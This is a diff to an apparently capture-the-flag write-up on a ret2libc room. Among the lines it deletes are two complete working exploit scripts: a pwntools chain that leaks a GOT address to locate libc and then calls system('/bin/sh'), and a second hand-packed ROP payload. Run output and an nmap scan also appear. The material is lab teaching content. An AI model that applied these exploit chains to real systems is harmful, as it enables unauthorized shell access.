@@ -570,8 +570,6 @@ p.interactive()
 
 And that's about it. Go write the exploit yourself if you weren't following along step by step. And if you've done everything well, you should have root privileges, so go grab the flag!</p>
 
-<p>7.1. <em>What is the flag?</em><br>
-<code>_______________________</code></p>
 
 ```bash
 :~# nmap -sC -sV -Pn -n -T4 -p- xx.xx.xxx.xx
@@ -634,132 +632,6 @@ tcp              LISTEN            0                 128                        
 :~/ret2libc# scp andy@...:/lib/x86_64-linux-gnu/libc.so.6 .
 andy@...'s password: 
 libc.so.6                                                                                                                               100% 1982KB  84.4MB/s   00:00    
-```
-
-```bash
-:~/ret2libc# cat poc.py
-
-#!/usr/bin/env python3
-from pwn import *
-
-context.binary = binary =  './exploit_me'
-
-elf = ELF(binary)
-rop = ROP(elf)
-PUTS_PLT = 0x4004a0
-
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-ret_gadget = pop_rdi + 1
-
-try:
-    libc = ELF('./libc.so.6')
-except:
-    print("[-] lib.so.6 error")
-    exit()
-
-try:
-    s = ssh(user='andy', host='xx.xx.xxx.xx', password='ret2libc!')
-    p = s.process('/home/andy/exploit_me')
-except Exception as e:
-    print(f"[-] -------------------- Connection Error: {e}")
-    exit()
-
-print("\n[+] -------------------- Sending Payload 1 ... ")
-padding = b'A' * 18 
-payload = padding
-payload += p64(pop_rdi)
-payload += p64(elf.got.gets)
-payload += p64(PUTS_PLT)
-payload += p64(elf.symbols.main)
-
-p.recvline(b'Type your name:')
-p.clean()
-
-p.sendline(payload)
-p.recvline()
-
-leak_raw = p.recvline().strip()
-
-leak = u64(leak_raw.ljust(8, b'\0'))
-log.success(f'Gets leak => {hex(leak)}')
-libc.address = leak - libc.symbols.gets
-log.success(f"Libc Base: {hex(libc.address)}")
-
-print("\n[+] -------------------- Sending Payload 2 ... ")
-payload = padding
-payload += p64(pop_rdi)
-payload += p64(next(libc.search(b'/bin/sh')))
-payload += p64(libc.symbols.system)
-
-p.clean()
-p.sendline(payload)
-p.recvline()
-print("[*] Trying ...")
-p.sendline(b'cat flag.txt; ls; id')
-time.sleep(1)
-
-try:
-    print(p.recvall(timeout=2).decode(errors='ignore'))
-except:
-    pass
-
-print("[*] Starting interactive mode...")
-p.interactive()
-```
-
-```bash
-:~/ret2libc# python3 poc.py
-[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
-[*] '/root/ret2libc/exploit_me'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      No canary found
-    NX:         NX enabled
-    PIE:        No PIE (0x400000)
-    Stripped:   No
-[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
-[*] Loaded 14 cached gadgets for './exploit_me'
-[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
-[*] '/root/ret2libc/libc.so.6'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        PIE enabled
-    SHSTK:      Enabled
-    IBT:        Enabled
-/usr/lib/python3/dist-packages/paramiko/transport.py:220: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release
-  "class": algorithms.Blowfish,
-[+] Connecting to ... on port 22: Done
-[*] andy@xx.xx.xxx.xx:
-    Distro    Ubuntu 20.04
-    OS:       linux
-    Arch:     amd64
-    Version:  5.15.0
-    ASLR:     Enabled
-    SHSTK:    Disabled
-    IBT:      Disabled
-[+] Starting remote process None on ...: pid 6111
-[!] ASLR is disabled for '/home/andy/exploit_me'!
-
-[+] -------------------- Sending Payload 1 ... 
-[+] Gets leak => 0x7fa3e8166970
-[+] Libc Base: 0x7fa3e80e3000
-
-[+] -------------------- Sending Payload 2 ... 
-[*] Trying ...
-[+] Receiving all data: Done (0B)
-[*] Stopped remote process 'exploit_me' on...5 (pid 6111)
-
-[*] Starting interactive mode...
-[*] Switching to interactive mode
-[*] Got EOF while reading in interactive
-```
-
-
-```bash
-andy@...:~$ pwd
-/home/andy
 ```
 
 
@@ -1388,38 +1260,14 @@ gef➤  find 0x00007f6beef7b000, 0x00007f6bef0f3000, (char)0x5f, (char)0xc3
 
 
 
+<img width="1147" height="740" alt="image" src="https://github.com/user-attachments/assets/32eee343-b1ab-405b-a90b-fbadb72c77e0" />
 
-  GNU nano 4.8                                                    exploit.py                                                     Modified  
-import struct
-import sys
+<br>
+<br>
+<br>
 
-# ------------------------------------------------------------
-# UPDATE THESE TWO VARIABLES
-# ------------------------------------------------------------
-system_addr =  0x7f6beefab290
-binsh_addr  = 0x7f7a2b4065bd 
-
-# ------------------------------------------------------------
-# ALREADY FILLED FOR THIS SESSION
-# ------------------------------------------------------------
-gadget_addr = 0x7f6beef7cb6a    # <--- From your 'find' command
-offset      = 18                # Confirmed
-
-# ------------------------------------------------------------
-# PAYLOAD
-# ------------------------------------------------------------
-payload = b"A" * offset
-payload += struct.pack("<Q", gadget_addr) # Pop RDI
-payload += struct.pack("<Q", binsh_addr)  # Arg: "/bin/sh"
-payload += struct.pack("<Q", system_addr) # Call System
-sys.stdout.buffer.write(payload)
-
-
-
-
-andy@ip-10-66-188-237:~$ python3 exploit.py > payload
-
-<p>The <code>got.plt</code>c region is mapped between addresses 0x0000000000601000 and 0x0000000000601038</p>
+<p>7.1. <em>What is the flag?</em><br>
+<code>thm{••••••••••••••••••••••••••••••••••••••••••••••••••••••••}</code></p>
 
 
 <br>
